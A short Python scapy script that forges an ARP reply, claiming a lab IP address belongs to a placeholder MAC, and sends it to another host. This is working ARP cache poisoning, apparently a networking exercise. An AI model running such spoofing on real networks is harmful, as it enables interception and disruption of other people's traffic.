from scapy.all import *

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
HWSRC = "42:42:42:42:42:42"
IS_AT = 2
PSRC = "10.0.0.42"
PDST = "10.0.0.2"
HWDST = getmacbyip(PDST)

def send_arp():
    frame = Ether(dst=HWDST)
    packet_ = frame / ARP(psrc=PSRC, hwsrc=HWSRC, op=IS_AT, pdst=PDST)
    packet_.show()
    sendp(packet_)

def main():
    send_arp()
    return (0)

if __name__ == "__main__":
    main()